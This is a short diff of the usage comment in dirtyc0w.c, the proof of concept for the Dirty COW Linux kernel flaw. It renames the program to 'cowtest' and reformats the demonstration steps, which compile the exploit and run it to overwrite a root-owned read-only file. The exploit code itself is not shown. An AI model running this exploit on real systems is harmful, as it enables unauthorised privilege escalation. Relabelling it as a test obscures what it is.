@@ -1,14 +1,17 @@
 /*
 ####################### dirtyc0w.c #######################
-$ sudo -s
-# echo this is not a test > foo
-# chmod 0404 foo
-$ ls -lah foo
+# name changed to cowtest as this is a test#
+sudo -s
+echo this is not a test > foo
+chmod 0404 foo
+ls -lah foo
+
 -r-----r-- 1 root root 19 Oct 20 15:23 foo
-$ cat foo
+
+cat foo
 this is not a test
-$ gcc -pthread dirtyc0w.c -o dirtyc0w
-$ ./dirtyc0w foo m00000000000000000
+$ gcc -pthread cowtest.c -o cowtest
+$ ./cowtest foo m00000000000000000
 mmap 56123000
 madvise 0
 procselfmem 1800000000
